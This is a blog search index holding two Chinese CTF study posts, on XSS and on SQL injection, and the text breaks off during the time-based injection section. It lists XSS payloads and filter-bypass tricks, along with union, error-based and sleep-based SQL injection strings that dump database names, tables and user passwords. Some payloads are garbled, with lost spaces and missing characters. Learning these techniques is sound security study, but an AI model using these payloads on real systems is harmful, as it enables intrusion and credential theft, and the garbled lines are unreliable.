<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSS（跨站脚本攻击）</title>
      <link href="/2023/01/14/XSS/"/>
      <url>/2023/01/14/XSS/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h1><h2 id="1-什么是XSS"><a href="#1-什么是XSS" class="headerlink" title="1.什么是XSS"></a>1.什么是XSS</h2><p>XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS。这是一种将任意 Javascript 代码插入到其他Web用户页面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里嵌入恶意代码。当用户浏览改页时，这些潜入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie窃取等。</p><hr><h2 id="2-XSS的类型"><a href="#2-XSS的类型" class="headerlink" title="2.XSS的类型"></a>2.XSS的类型</h2><p>XSS类型一般分为三种：</p><h6 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h6><p>反射型XSS只是简单的把用户输入的数据“反射”给浏览器，也就是需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型XSS也叫作“非持久性XSS”。</p><p>漏洞产生原因一般是网站只是简单地将用户输入的数据直接或未经过完善的安全过滤就在浏览器中进行输岀，导致输岀的欻据中存在可被浏览器执行的代码数据。</p><h6 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2.存储型XSS"></a>2.存储型XSS</h6><p>存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性，当再次访问页面时会被执行。造成漏洞原因一般是由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中。</p><h6 id="3-DOM-Based-XSS"><a href="#3-DOM-Based-XSS" class="headerlink" title="3.DOM Based XSS"></a>3.DOM Based XSS</h6><p>实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分的，从效果上来说也是反射型XSS单独划分出来的，因为DOM Based XSS的形成原因比较特别。这是由于客户端脚本自身解析不正确导致的安全问题。这种利用也需要受害者点击链接来触发，DOM型XSS是前端代码中存在了漏洞，而反射型是后端代码中存在了漏洞。反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，在dom xss中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。</p><hr><h2 id="3-XSS危害"><a href="#3-XSS危害" class="headerlink" title="3.XSS危害"></a>3.XSS危害</h2><ul><li><p>流量劫持，利用木马修改浏览器不停的弹出新的窗口强制性的让用户访问指定的网站，为指定网站增加流量</p></li><li><p>获取用户cookie信息，盗取账号（普通用户、管理员等账号）</p></li><li><p>篡改、删除页面信息（钓鱼操作）</p></li><li><p>配合CSRF攻击，实施进一步的攻击，控制被害人的电脑访问其他网站</p></li></ul><hr><h2 id="4-XSS常见出现的地方"><a href="#4-XSS常见出现的地方" class="headerlink" title="4.XSS常见出现的地方"></a>4.XSS常见出现的地方</h2><h6 id="1-数据交互的地方"><a href="#1-数据交互的地方" class="headerlink" title="1.数据交互的地方"></a>1.数据交互的地方</h6><ul><li><p>get、post、cookies、headers</p></li><li><p>反馈与浏览</p></li><li><p>富文本编辑器</p></li><li><p>各类标签插入和自定义</p></li></ul><h6 id="2、数据输出的地方"><a href="#2、数据输出的地方" class="headerlink" title="2、数据输出的地方"></a>2、数据输出的地方</h6><ul><li><p>用户资料</p></li><li><p>关键词、标签、说明</p></li><li><p>文件上传</p></li></ul><h3 id="5-常见标签"><a href="#5-常见标签" class="headerlink" title="5.常见标签"></a>5.常见标签</h3><h5 id="1-lt-img-gt-标签"><a href="#1-lt-img-gt-标签" class="headerlink" title="1.&lt;img&gt;标签"></a>1.<code>&lt;img&gt;</code>标签</h5><h6 id="利用方式1"><a href="#利用方式1" class="headerlink" title="利用方式1"></a>利用方式1</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(String.formCharCode(88,83,83))</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">scr</span>=<span class="string">&quot;URL&quot;</span><span class="attr">style</span>=<span class="string">&#x27;Xss:expression(alert(/xss));&#x27;</span></span></span><br></pre></td></tr></table></figure><blockquote><!--CSS标记xss--><p><code>img STYLE=&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;</code></p></blockquote><h6 id="XSS利用方式2"><a href="#XSS利用方式2" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;<span class="attr">alert</span>(&#x27;<span class="attr">xss</span>&#x27;)&quot;)&gt;</span></span><br></pre></td></tr></table></figure><p>XSS利用方式3</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-lt-a-gt-标签"><a href="#2-lt-a-gt-标签" class="headerlink" title="2.&lt;a&gt;标签"></a>2.<code>&lt;a&gt;</code>标签</h5><h6 id="标准格式"><a href="#标准格式" class="headerlink" title="标准格式"></a>标准格式</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span>baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="XSS利用方式1"><a href="#XSS利用方式1" class="headerlink" title="XSS利用方式1"></a>XSS利用方式1</h6><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:aaa&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h6 id="XSS利用方式2-1"><a href="#XSS利用方式2-1" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h6><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h6 id="利用方式3"><a href="#利用方式3" class="headerlink" title="利用方式3"></a>利用方式3</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span><span class="attr">onclick</span>=<span class="string">eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="利用方式4"><a href="#利用方式4" class="headerlink" title="利用方式4"></a>利用方式4</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">kycg.asp?ttt</span>=<span class="string">1000</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;)<span class="attr">y</span>=<span class="string">2016</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="3-input标签"><a href="#3-input标签" class="headerlink" title="3.input标签"></a>3.input标签</h5><h6 id="标准格式-1"><a href="#标准格式-1" class="headerlink" title="标准格式"></a>标准格式</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="利用方式1-1"><a href="#利用方式1-1" class="headerlink" title="利用方式1"></a>利用方式1</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span><span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)<span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="利用方式2"><a href="#利用方式2" class="headerlink" title="利用方式2"></a>利用方式2</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;inputname=&quot;name&quot;value=&quot;&quot;onmouseover=prompt(&#x27;xss&#x27;)bad=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure><h6 id="利用方式4-1"><a href="#利用方式4-1" class="headerlink" title="利用方式4"></a>利用方式4</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;inputname=&quot;name&quot;value=&quot;&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="4-lt-form-gt-标签"><a href="#4-lt-form-gt-标签" class="headerlink" title="4.&lt;form&gt;标签"></a>4.<code>&lt;form&gt;</code>标签</h5><h6 id="XSS利用方式1-1"><a href="#XSS利用方式1-1" class="headerlink" title="XSS利用方式1"></a>XSS利用方式1</h6><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;formaction=javascript:alert(&#x27;xss&#x27;)method=&quot;get&quot;&gt;</span><br><span class="line">&lt;formaction=javascript:alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure></blockquote><h6 id="XSS利用方式2-2"><a href="#XSS利用方式2-2" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h6><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;formmethod=postaction=aa.asp? onmouseover=prompt(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;formmethod=postaction=aa.asp? onmouseover=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;formaction=1 onmouseover=alert(&#x27;xss)&gt;</span><br></pre></td></tr></table></figure></blockquote><h6 id="XSS利用方式3"><a href="#XSS利用方式3" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h6><blockquote><!--原code--><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;formmethod=postaction=&quot;data:text/html;base64,<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure><!--base64编码--><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;formmethod=postaction=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure></blockquote><h5 id="5-lt-iframe-gt-标签"><a href="#5-lt-iframe-gt-标签" class="headerlink" title="5.&lt;iframe&gt;标签"></a>5.<code>&lt;iframe&gt;</code>标签</h5><h6 id="XSS利用方式1-2"><a href="#XSS利用方式1-2" class="headerlink" title="XSS利用方式1"></a>XSS利用方式1</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframesrc=javascript:alert(&#x27;xss&#x27;);height=5width=1000/&gt;<span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="XSS利用方式2-3"><a href="#XSS利用方式2-3" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframesrc=&quot;data:text/html,<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><!--原code--><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframesrc=&quot;data:text/html;base64,<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure><!--base64编码--><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframesrc=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure><h6 id="XSS利用方式3-1"><a href="#XSS利用方式3-1" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframesrc=&quot;aaa&quot;onmouseover=alert(&#x27;xss&#x27;)/&gt;<span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="XSS利用方式3-2"><a href="#XSS利用方式3-2" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframesrc=&quot;javascript:prompt(`xss`)&quot;&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="6-svg-lt-gt-标签"><a href="#6-svg-lt-gt-标签" class="headerlink" title="6.svg&lt;&gt;标签"></a>6.<code>svg&lt;&gt;</code>标签</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svgonload=alert(1)&gt;﻿</span><br></pre></td></tr></table></figure><h2 id="6-XSS绕过"><a href="#6-XSS绕过" class="headerlink" title="6.XSS绕过"></a>6.XSS绕过</h2><h6 id="大小写绕过："><a href="#大小写绕过：" class="headerlink" title="大小写绕过："></a>大小写绕过：</h6><p>HTML对标签大小写不敏感，可以利用大小写混用绕过， 例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">改为<span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><h6 id="双写绕过："><a href="#双写绕过：" class="headerlink" title="双写绕过："></a>双写绕过：</h6><p>有些情况的规则会将黑名单标签替换为空，可以利用这一点构造标签，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">改为&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt;</span></span></span><br></pre></td></tr></table></figure><p>同理某些注释符在规则中也会替换为空，这时候可以利用它构造payload，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">改为&lt;scr<span class="comment">&lt;!---test---&gt;</span>ipt&gt;</span></span></span><br></pre></td></tr></table></figure><h6 id="开口标签："><a href="#开口标签：" class="headerlink" title="开口标签："></a>开口标签：</h6><p>在某些特殊环境，由于html代码补全机制，可以故意不闭合标签绕过黑名单检测，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>改为&lt;script</span><br></pre></td></tr></table></figure><h6 id="空格回车TAB："><a href="#空格回车TAB：" class="headerlink" title="空格回车TAB："></a>空格回车TAB：</h6><p>例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js伪协议javascript:alert(&#x27;xss&#x27;);可以改为java script:alert(&#x27;xss’);等</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2023/01/11/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/01/11/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h2><p>针对SQL注入的攻击行为可描述为通过用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序意料之外结果的攻击行为。</p><p>其成因可归结为以下两个原理叠加造成：</p><ol><li>程序编写者在处理程序和数据库交互时，使用字符串<strong>拼接的方式构造SQL语句</strong>。</li><li><strong>未对用户可控参数进行足够的过滤</strong>便将参数内容拼接进入到SQL语句中。</li></ol><hr><h2 id="2-漏洞危害"><a href="#2-漏洞危害" class="headerlink" title="2.漏洞危害"></a>2.漏洞危害</h2><p>SQL注入漏洞根据不同的标准，从数据类型分类来看 SQL注入分为数字型和字符型。 数字型注入就是说注入点的数据，拼接到SQL语句中是以数字型出现的，即数据两边没有被单引号、双引号包括。 字符型注入正好相反 按照提交数据的位置分类GET、POST、Cookie和称GPC 数据库对基本的数据类型分为三大类：数字、文本、时间</p><hr><h2 id="3-寻找SQL注入"><a href="#3-寻找SQL注入" class="headerlink" title="3.寻找SQL注入"></a>3.寻找SQL注入</h2><p>测试注入点：</p><ol><li>在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在Sql注入</li><li>注入点判断：<code>id=1&#39;（常见）</code>id&#x3D;1” id&#x3D;1’) id&#x3D;1’)) id&#x3D;1”) id&#x3D;1”))。+1、-1   有变化有回显考虑联合查询；有变化有报错考虑报错注入；没变化没报错没回显考虑布尔盲注；没有以上情况，考虑延时注入</li><li>通过构造get、post、cookie请求再相应的http头信息等查找敏感信息</li><li>通过构造一些语句，检测服务器中响应的异常</li></ol><hr><h2 id="4-MySQL注入"><a href="#4-MySQL注入" class="headerlink" title="4.MySQL注入"></a>4.MySQL注入</h2><h3 id="1-普通注入"><a href="#1-普通注入" class="headerlink" title="1.普通注入"></a>1.普通注入</h3><h5 id="1-判断字段个数（列数）"><a href="#1-判断字段个数（列数）" class="headerlink" title="1.判断字段个数（列数）"></a>1.判断字段个数（列数）</h5><p>使用<code>order by</code>语句来判断当前select 语句所查询的虚拟列表的列数。</p><p><code>order by</code>语句本意时按照某一列进行排序，在mysql 中可以使用数字来代替具体的列名，比如<code>order by 1</code> 就是按照第一列进行排序，如果mysql 没有找到对应的列，就会报错<code>Unkown column</code>.我们可以依次增加数字，直到数据库报错。</p><p>得到字段个数之后，可以尝试构造联合查询语句<br>这里我们并不知道表名，根据mysql 数据库的特性，select 语句执行过程中，并不需要指定表名。</p><p>页面显示的是第一张虚拟表的内容,那么我们可以考虑让第一张虚拟表的查询条件为假，则显示第二条记录。因此构造SQL，语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=33&#x27; and 1=2 union select 1,2,3,4,5,6,7,8,9,10,-- +</span><br><span class="line">?id=-33&#x27; 1=2 union select 1,2,3,4,5,6,7,8,9,10,-- +</span><br></pre></td></tr></table></figure><h5 id="2-数据库"><a href="#2-数据库" class="headerlink" title="2.数据库"></a>2.数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3-- +</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata #</span><br></pre></td></tr></table></figure><h5 id="3-数据表"><a href="#3-数据表" class="headerlink" title="3.数据表"></a>3.数据表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;数据库&#x27;#</span><br></pre></td></tr></table></figure><h5 id="4-字段"><a href="#4-字段" class="headerlink" title="4.字段"></a>4.字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;数据表&#x27;#</span><br></pre></td></tr></table></figure><h5 id="5-数据值"><a href="#5-数据值" class="headerlink" title="5.数据值"></a>5.数据值</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(0x7e,字段,0x7e),3 from 数据库名.数据表名--+</span><br></pre></td></tr></table></figure><h5 id="6-一些其他函数"><a href="#6-一些其他函数" class="headerlink" title="6.一些其他函数"></a>6.一些其他函数</h5><p><code>system_user()</code>系统用户名；<code>user()</code>用户名；<code>current_user()</code>当前用户名；<code>database()</code>数据库名；<code>version() MYSQL</code>数据库版本；<code>load_file() </code>MYSQL读取本地文件的函数；<code>@@datadir </code>读取数据库路径；<code>@@basedir MYSQL </code>安装路径；<code>@@version_compile_os </code>操作系统</p><p>多条数据显示函数：<code>concat()、group_concat()、concat_ws()</code></p><hr><h3 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h3><h5 id="1-extractvalue函数"><a href="#1-extractvalue函数" class="headerlink" title="1.extractvalue函数"></a>1.extractvalue函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select @@version),0x7e))--+ (版本号)</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select @@version_compile_os),0x7e))--+ (操作系统)</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e))--+ （数据库）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e))--+ （数据表）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e))--+（字段）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e))--+ （数据）</span><br></pre></td></tr></table></figure><h5 id="2-updatexml函数"><a href="#2-updatexml函数" class="headerlink" title="2.updatexml函数"></a>2.updatexml函数</h5><p>细节问题： <code>extractvalue()</code>基本一样，改个关键字<code>updatexml</code>即可,与<code>extractvalue</code>有个很大的区别实在末尾注入加上，如：<code>（1，concat(select @@version),1)</code>,而extractvalue函数末尾不加1（数值）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),1)--+ （数据库）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)--+ （数据表）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 3,1),0x7e),1)--+ （字段）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e),1)--+ （数据）</span><br></pre></td></tr></table></figure><h5 id="3-floor函数"><a href="#3-floor函数" class="headerlink" title="3.floor函数"></a>3.floor函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ (数据库，不断改变limit得到其他)</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （users表）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （password字段）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （数值）</span><br></pre></td></tr></table></figure><hr><h3 id="3-延时注入"><a href="#3-延时注入" class="headerlink" title="3.延时注入"></a>3.延时注入</h3><h5 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(5)--+ //正常休眠</span><br><span class="line">?id=1&quot; and sleep(5)--+ //无休眠</span><br><span class="line">?id=1&#x27;) and sleep(5)--+//无休眠</span><br><span class="line">?id=1&quot;) and sleep(5)--+//无休眠</span><br><span class="line">?id=1&#x27; and if(length(database())=8,sleep(10),1)--+</span><br></pre></td></tr></table></figure><h5 id="2-获取数据库"><a href="#2-获取数据库" class="headerlink" title="2.获取数据库"></a>2.获取数据库</h5><p>通过判断服务器没有睡眠，ascii码转换115为s ，那么就得出数据库第一个字符为s,下面就可以依次类推了。substr(database(),N,1)可以通过改变N的值来判断数据的第几个字符。</p><figure class="highlight 